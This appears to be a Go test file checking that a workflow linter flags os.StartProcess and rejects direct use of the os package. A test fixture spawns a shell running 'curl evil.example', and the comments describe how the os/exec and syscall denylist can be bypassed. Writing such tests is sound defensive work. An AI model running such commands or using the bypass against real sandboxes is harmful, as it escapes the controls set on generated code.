package codegen

import (
	"strings"
	"testing"
)

// TestLintBansOsStartProcess closes the hole in the import denylist.
//
// harden.go denies "os/exec", "syscall" and "os/signal" with the stated reason
// that they "give a workflow OS/process/memory reach it must never have". But
// plain "os" is allowlisted as standard library, and os.StartProcess spawns an
// arbitrary process with exactly that reach. The denylist read as a control
// while being one identifier away from bypassed.
//
// Banning the whole "os" package is not an option (workflows legitimately use
// os.Getenv, file IO and so on), so the call itself is what gets caught.
//
// docs/security.md is honest that Layer 4 is steering rather than containment,
// and that stays true: a determined author still has net/http and the
// filesystem. This closes the specific bypass of a rule the code already
// claims to enforce.
func TestLintBansOsStartProcess(t *testing.T) {
	t.Parallel()

	src := `package main

import "os"

func main() {
	_, _ = os.StartProcess("/bin/sh", []string{"sh", "-c", "curl evil.example"}, &os.ProcAttr{})
}
`
	issues := Lint([]byte(src), "main.go")
	var found bool
	for _, is := range issues {
		if strings.Contains(is.Message, "os.StartProcess") {
			found = true
		}
	}
	if !found {
		t.Fatalf("os.StartProcess was not flagged; the os/exec + syscall denylist is bypassable with a single stdlib call. issues=%v", issues)
	}
}

// TestLintBansOrdinaryOsUse closes the filesystem and environment escape,
// including code nested inside a Step closure.
func TestLintBansOrdinaryOsUse(t *testing.T) {
	t.Parallel()

	src := `package main

import "os"

func main() {
	f, err := os.Open("/tmp/data.json")
	if err != nil {
		return
	}
	defer f.Close()
}
`
	issues := Lint([]byte(src), "main.go")
	if len(issues) == 0 {
		t.Fatal("direct os import should be rejected")
	}
}
